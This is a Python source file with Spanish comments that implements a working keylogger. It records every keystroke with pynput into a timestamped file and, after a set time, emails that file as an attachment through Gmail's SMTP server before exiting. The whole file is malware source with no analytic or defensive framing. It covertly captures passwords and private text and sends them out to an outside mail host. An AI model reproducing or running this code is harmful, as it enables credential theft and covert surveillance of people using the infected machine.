import datetime  # Hora y fecha del dispositivo
import smtplib  # simple mail transference protocol
import time  # Obtener el tiempo
from email.mime.base import MIMEBase  # Base para el correo, es decir el header
from email.mime.multipart import MIMEMultipart  # Para dividir el email en varios mensajes
from email.mime.text import MIMEText  # Agregar el texto del email
from pynput.keyboard import Listener  # Lee las teclas presionadas en el teclado


def key_listener(seg, email, password):  # Funcion para escuchar las teclas presionadas
    d = datetime.datetime.now().strftime(
        "%Y-%m-%d_%H-%M-%S")  # Define la hora y fecha en que se esta ejecutando esta función

    file_name = 'keylogger_{}.txt'.format(d)  # Crea el nombre para el archivo

    f = open(file_name, 'w')  # Se abre el archivo

    t0 = time.time()  # Tiempo actual

    def key_recorder(key):  # Registro y reemplazo de teclas especiales como enter, backspace y espacio
        key = str(key)
        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace", "%BORRAR%"))
        elif key == '<65027>':
            f.write('%ARROBA%')
        else:
            f.write(key.replace("'", ""))

        if time.time() - t0 > seg:  # Cuenta el tiempo en seg para poder enviar el archivo por correo
            f.close()
            enviar_email(file_name, email, password)
            quit()

    with Listener(on_press=key_recorder) as listener:
        listener.join()


def enviar_email(nombre, email, password):
    msg = MIMEMultipart()
    mensaje = 'Tienes un reporte'  # Mensaje del email

    msg['From'] = email  # Encabezado del email
    msg['To'] = email
    msg['Subject'] = 'Reporte'

    msg.attach(MIMEText(mensaje, 'plain'))

    attachment = open(nombre, 'r')

    p = MIMEBase('application', 'octet-stream')  # Posiciona el encabezado en su lugar
    p.set_payload((attachment).read())  # Adjunta el archivo de keylogger
    p.add_header('Content-Disposition', "attachment; filename= %s" % str(nombre))
    msg.attach(p)

    server = smtplib.SMTP('smtp.gmail.com: 587')  # Ejecuta el protocolo simple de email de gmail
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

